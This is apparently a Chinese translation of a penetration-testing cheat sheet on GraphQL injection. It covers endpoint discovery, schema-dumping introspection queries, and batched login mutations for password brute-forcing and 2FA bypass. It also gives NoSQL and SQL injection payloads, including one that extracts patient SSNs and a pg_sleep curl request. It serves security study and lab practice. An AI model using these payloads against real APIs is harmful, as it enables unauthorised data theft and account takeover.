[原文文档](README.en.md)

# GraphQL 注入

> GraphQL 是一种 API 查询语言和用于使用现有数据满足这些查询的运行时。通过在这些类型上定义类型和字段，然后为每种类型的每个字段提供函数来创建 GraphQL 服务

## 摘要

- [工具](#tools)
- [枚举](#enumeration)
    - [常见 GraphQL 端点](#common-graphql-endpoints)
    - [识别注入点](#identify-an-injection-point)
    - [通过内省枚举数据库模式](#enumerate-database-schema-via-introspection)
    - [通过建议枚举数据库模式](#enumerate-database-schema-via-suggestions)
    - [枚举类型定义](#enumerate-types-definition)
    - [列出到达类型的路径](#list-path-to-reach-a-type)
- [方法论](#methodology)
    - [提取数据](#extract-data)
    - [使用边/节点提取数据](#extract-data-using-edgesnodes)
    - [使用投影提取数据](#extract-data-using-projections)
    - [变更](#mutations)
    - [GraphQL 批处理攻击](#graphql-batching-attacks)
        - [基于 JSON 列表的批处理](#json-list-based-batching)
        - [基于查询名称的批处理](#query-name-based-batching)
- [注入](#injections)
    - [NoSQL 注入](#nosql-injection)
    - [SQL 注入](#sql-injection)
- [实验环境](#labs)
- [参考资料](#references)

## 工具

- [swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) - 用于与 graphql 端点交互以进行渗透测试的脚本引擎
- [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - GraphQL 安全研究材料
- [doyensec/inql](https://github.com/doyensec/inql) - 用于 GraphQL 安全测试的 Burp 扩展
- [doyensec/GQLSpection](https://github.com/doyensec/GQLSpection) - GQLSpection - 解析 GraphQL 内省模式并生成可能的查询
- [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - 列出在 GraphQL 模式中到达给定类型的不同方式
- [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - 用于探索 GraphQL API 的广泛 IDE
- [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - 尽管内省被禁用，仍获取 GraphQL API 模式
- [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - GraphQL 密码暴力破解和模糊测试工具
- [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - 安全专业人员用于研究 GraphQL 实现中安全差距的 GraphQL 威胁框架
- [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - GraphQL API 安全审计工具
- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL 服务器引擎指纹识别工具
- [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - 将任何 GraphQL API 表示为交互式图表
- [Insomnia](https://insomnia.rest/) - 跨平台 HTTP 和 GraphQL 客户端

## 枚举

### 常见 GraphQL 端点

大多数情况下，GraphQL 位于 `/graphql` 或 `/graphiql` 端点。
更完整的列表可在 [danielmiessler/SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/Discovery/Web-Content/graphql.txt) 找到。

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```

### 识别注入点

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

检查错误是否可见。

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

### 通过内省枚举数据库模式

用于转储数据库模式的 URL 编码查询。

```js
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

用于转储数据库模式的 URL 解码查询。

```javascript
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

用于转储数据库模式的单行查询，不使用片段。

```js
__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
```

```js
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

### 通过建议枚举数据库模式

当您使用未知关键字时，GraphQL 后端将响应与其模式相关的建议。

```json
{
  "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
}
```

当 GraphQL API 的模式不可访问时，您还可以尝试使用词表（如 [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist)）暴力破解已知关键字、字段和类型名称。

### 枚举类型定义

使用以下 GraphQL 查询枚举感兴趣类型的定义，将 "User" 替换为您选择的类型

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

### 列出到达类型的路径

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill
Found 27 ways to reach the "Skill" node from the "Query" node:
- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill
- Query (query) -> Query (skills) -> Skill
```

## 方法论

### 提取数据

```js
example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}
```

![HTB Help - GraphQL 注入](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/Images/htb-help.png?raw=true)

### 使用边/节点提取数据

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### 使用投影提取数据

:warning: 不要忘记转义 **options** 内的 "。

```js
{doctors(options: "{\"patients.ssn\" :1}"){firstName lastName id patients{ssn}}}
```

### 变更

变更像函数一样工作，您可以使用它们与 GraphQL 交互。

```javascript
# mutation{signIn(login:"Admin", password:"secretp@ssw0rd"){token}}
# mutation{addUser(id:"1", name:"Dan Abramov", email:"dan@dan.com") {id name email}}
```

### GraphQL 批处理攻击

常见场景：

- 密码暴力破解放大场景
- 速率限制绕过
- 2FA 绕过

#### 基于 JSON 列表的批处理

> 查询批处理是 GraphQL 的一项功能，允许在单个 HTTP 请求中将多个查询发送到服务器。客户端可以在单个 POST 请求中向 GraphQL 服务器发送查询数组，而不是在单独请求中发送每个查询。这减少了 HTTP 请求的数量，可以提高应用程序的性能。

查询批处理通过在请求体中定义操作数组来工作。每个操作可以有自己的查询、变量和操作名称。服务器处理数组中的每个操作，并返回响应数组，批量中的每个查询对应一个响应。

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```

#### 基于查询名称的批处理

```json
{
    "query": "query { qname: Query { field1 } qname1: Query { field1 } }"
}
```

使用别名多次发送相同的变更

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

## 注入

> 由于 GraphQL 只是客户端和数据库之间的层，SQL 和 NoSQL 注入仍然是可能的。

### NoSQL 注入

在 `search` 参数内使用 `$regex`。

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

### SQL 注入

在 GraphQL 参数内发送单引号 `'` 以触发 SQL 注入

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

GraphQL 字段内的简单 SQL 注入。

```powershell
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

## 实验环境

- [PortSwigger - 访问私有 GraphQL 帖子](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
- [PortSwigger - 意外暴露私有 GraphQL 字段](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
- [PortSwigger - 找到隐藏的 GraphQL 端点](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
- [PortSwigger - 绕过 GraphQL 暴力破解保护](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
- [PortSwigger - 通过 GraphQL 执行 CSRF 利用](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- [Root Me - GraphQL - 内省](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Introspection)
- [Root Me - GraphQL - 注入](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Injection)
- [Root Me - GraphQL - 后端注入](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Backend-injection)
- [Root Me - GraphQL - 变更](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## 参考资料

- [为渗透测试构建免费开源 GraphQL 词表 - Nohé Hinniger-Foray - 2023年8月17日](https://escape.tech/blog/graphql-security-wordlist/)
- [利用 GraphQL - AssetNote - Shubham Shah - 2021年8月29日](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [GraphQL 批处理攻击 - Wallarm - 2019年12月13日](https://lab.wallarm.com/graphql-batching-attack/)
- [面向渗透测试人员的 GraphQL 演示 - Alexandre ZANNI (@noraj) - 2022年12月1日](https://acceis.github.io/prez-graphql/)
- [API 破解 GraphQL - @ghostlulz - 2019年6月8日](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
- [发现 GraphQL 端点和 SQLi 漏洞 - Matías Choren - 2018年9月23日](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
- [GraphQL 滥用：通过参数走私绕过账户级别权限 - Jon Bottarini - 2018年3月14日](https://labs.detectify.com/2018/03/14/graphql-abuse/)
- [GraphQL 错误窃取任何人地址 - Pratik Yadav - 2019年9月1日](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
- [GraphQL 备忘单 - devhints.io - 2018年11月7日](https://devhints.io/graphql)
- [GraphQL 内省 - GraphQL - 2024年8月21日](https://graphql.org/learn/introspection/)
- [通过 JSON 类型的 GraphQL NoSQL 注入 - Pete Corey - 2017年6月12日](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
- [HIP19 解决方案 - Meet Your Doctor 1,2,3 - Swissky - 2019年6月22日](https://swisskyrepo.github.io/HIP19-MeetYourDoctor/)
- [如何使用 Node.js、Express 和 MongoDB 设置 GraphQL 服务器 - Leonardo Maldonado - 2018年11月5日](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
- [GraphQL 简介 - GraphQL - 2024年11月1日](https://graphql.org/learn/)
- [内省查询泄露敏感 graphql 系统信息 - @Zuriel - 2017年11月18日](https://hackerone.com/reports/291531)
- [掠夺 GraphQL 端点以获取乐趣和利润 - @theRaz0r - 2017年6月8日](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
- [保护您的 GraphQL API 免受恶意查询 - Max Stoiber - 2018年2月21日](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
- [通过 embedded_submission_form_uuid 参数在 GraphQL 端点中的 SQL 注入 - Jobert Abma (jobert) - 2018年11月6日](https://hackerone.com/reports/435066)